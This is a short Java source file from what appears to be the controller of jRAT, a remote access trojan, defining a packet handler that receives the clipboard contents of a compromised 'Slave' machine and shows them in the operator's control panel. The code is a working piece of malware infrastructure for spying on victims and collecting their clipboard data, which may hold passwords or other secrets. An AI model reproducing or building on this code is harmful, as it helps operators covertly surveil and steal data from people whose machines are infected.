package su.jrat.client.packets.incoming;

import java.io.DataInputStream;

import su.jrat.client.Slave;
import su.jrat.client.ui.frames.FrameControlPanel;
import su.jrat.client.ui.panels.PanelControlClipboard;


public class Packet41Clipboard extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String content = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlClipboard panel = (PanelControlClipboard) frame.panels.get("clipboard");
			panel.getPane().setText(content);
		}
	}

}
